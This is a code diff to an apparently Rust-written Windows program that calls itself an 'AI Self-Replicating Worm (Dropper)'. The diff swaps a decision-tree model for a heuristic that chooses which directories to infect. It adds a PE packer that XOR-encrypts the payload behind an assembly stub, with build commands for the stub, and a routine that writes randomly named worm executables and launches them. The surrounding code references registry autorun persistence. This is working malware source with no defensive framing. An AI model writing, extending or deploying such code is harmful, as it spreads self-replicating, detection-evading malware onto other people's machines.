@@ -6,9 +6,6 @@ use winreg::enums::*;
 use winreg::RegKey;
 use sysinfo::{ProcessExt, System, SystemExt};
 use num_cpus;
-use linfa::prelude::*;
-use linfa_trees::DecisionTree;
-use ndarray::{Array1, Array2};
 
 #[derive(Parser)]
 #[command(name = "AI Self-Replicating Worm (Dropper)")]
@@ -103,44 +100,111 @@ fn add_to_autorun() {
 }
 
 fn ai_decide_to_drop(file_count: f32, depth: f32, verbose: bool) -> bool {
-    // Generate realistic training data based on typical directory structures
-    let mut features = Vec::new();
-    let mut labels = Vec::new();
+    // Use simple heuristic instead of real-time training for performance
+    // Drop if directory has more than 10 files and depth > 2 (crowded and deep)
+    let decision = file_count > 10.0 && depth > 2.0;
 
-    // Simulate data from real directories: small dirs (few files, shallow) -> false, large/deep -> true
-    for i in 0..100 {
-        let fc = (i % 20) as f32 + rand::random::<f32>() * 10.0; // 0-30 files
-        let d = (i % 5) as f32 + rand::random::<f32>() * 3.0; // 0-8 depth
-        let should_drop = fc > 10.0 && d > 2.0; // Realistic rule: drop if crowded and deep
-        features.push(vec![fc, d]);
-        labels.push(if should_drop { 1 } else { 0 });
-    }
-
-    let num_samples = features.len();
-    let features_array = Array2::from_shape_vec((num_samples, 2), features.into_iter().flatten().collect()).unwrap();
-    let labels_array = Array1::from_vec(labels);
-
-    let dataset = Dataset::new(features_array, labels_array);
     if verbose {
-        println!("Training with {} samples", num_samples);
+        println!("[AI] Directory has {} files, depth {}, deciding to {}", file_count, depth, if decision { "drop" } else { "skip" });
     }
-    let model = DecisionTree::params().fit(&dataset).unwrap();
-
-    let input = Array2::from_shape_vec((1, 2), vec![file_count, depth]).unwrap();
-    let prediction = model.predict(&input);
-    let decision = prediction[0] == 1;
-
-    println!("[AI] Directory has {} files, depth {}, deciding to {}", file_count, depth, if decision { "drop" } else { "skip" });
     decision
 }
 
+// Process injection placeholder - requires Windows API shellcode for full implementation
+
+// Removed polymorphic_encrypt - now handled inline in drop_and_spawn_to_directory
+
+// PE Packer - creates a self-decrypting executable with compiled assembly stub
+fn pe_pack(binary: &[u8]) -> Vec<u8> {
+    // Load the compiled assembly stub
+    let stub_code = match std::fs::read("stub.exe") {
+        Ok(code) => code,
+        Err(_) => {
+            eprintln!("[-] ERROR: stub.exe not found! Compile stub.asm first:");
+            eprintln!("    nasm -f bin stub.asm -o stub.exe");
+            eprintln!("    or use MASM: ml /c /coff stub.asm && link /subsystem:windows stub.obj");
+            // Fallback to dummy for compilation
+            vec![0x4D, 0x5A, 0x00, 0x00]
+        }
+    };
+
+    let mut packed = stub_code;
+    packed.extend_from_slice(b"PE_PACK"); // Custom signature for stub to find
+    packed.extend_from_slice(&(binary.len() as u32).to_le_bytes()); // Payload size
+    packed.extend(binary); // Payload (will be encrypted later)
+    packed
+}
+
+// Custom Loader - validates packed executable format
+// In a real implementation, this would be the stub code that runs first
+#[allow(dead_code)] // Placeholder for future implementation
+fn custom_loader(packed: &[u8]) -> bool {
+    // Check MZ header (stub is executable)
+    if packed.len() < 2 || packed[0] != 0x4D || packed[1] != 0x5A {
+        return false;
+    }
+
+    // Find custom signature in the stub
+    // In real stub: scan for "PE_PACK" signature
+    let signature_pos = packed.windows(7).position(|w| w == b"PE_PACK");
+    if signature_pos.is_none() {
+        return false;
+    }
+    let sig_start = signature_pos.unwrap();
+
+    // Extract payload size (4 bytes after signature)
+    if packed.len() < sig_start + 11 {
+        return false;
+    }
+    let size_start = sig_start + 7;
+    let original_size = u32::from_le_bytes(packed[size_start..size_start+4].try_into().unwrap()) as usize;
+
+    // Verify payload exists
+    let payload_start = size_start + 4;
+    if packed.len() < payload_start + original_size {
+        return false;
+    }
+
+    // In a real stub implementation:
+    // 1. Locate polymorphic key (first byte of payload)
+    // 2. Allocate memory for decrypted payload
+    // 3. XOR decrypt payload[1..] using key
+    // 4. Jump to decrypted code in memory
+
+    true
+}
+
 fn drop_and_spawn_to_directory(target_dir: &Path, binary: &[u8], verbose: bool) {
+    // Create packed binary with stub + encrypted payload
+    let mut packed_binary = pe_pack(binary);
+
+    // Encrypt only the payload part (after stub), keep stub executable
+    let sig_size = 7; // "PE_PACK"
+    let size_size = 4; // 4 bytes for size
+    let stub_size = packed_binary.len() - binary.len() - sig_size - size_size; // Calculate actual stub size
+    let payload_start = stub_size + sig_size + size_size;
+
+    if packed_binary.len() > payload_start {
+        // Encrypt payload in-place
+        let mut rng = rand::thread_rng();
+        let key: u8 = rng.gen();
+
+        // Store key at the beginning of payload
+        packed_binary[payload_start] = key;
+
+        // Encrypt the rest of payload (skip MZ header preservation since payload isn't executable)
+        for i in (payload_start + 2)..packed_binary.len() {
+            packed_binary[i] ^= key;
+        }
+    }
+
+    // Fallback to file drop (process injection placeholder for future implementation)
     let mut rng = rand::thread_rng();
     let random_name = format!("worm_{}.exe", rng.gen_range(1000..10000));
     let target_path = target_dir.join(random_name);
 
-    if std::fs::write(&target_path, binary).is_ok() {
-        println!("[+] Dropped executable to: {:?}", target_path);
+    if std::fs::write(&target_path, &packed_binary).is_ok() {
+        println!("[+] Dropped packed polymorphic executable to: {:?}", target_path);
         if let Ok(child) = std::process::Command::new(&target_path).spawn() {
             println!("[+] Spawned process: {}", child.id());
         } else {
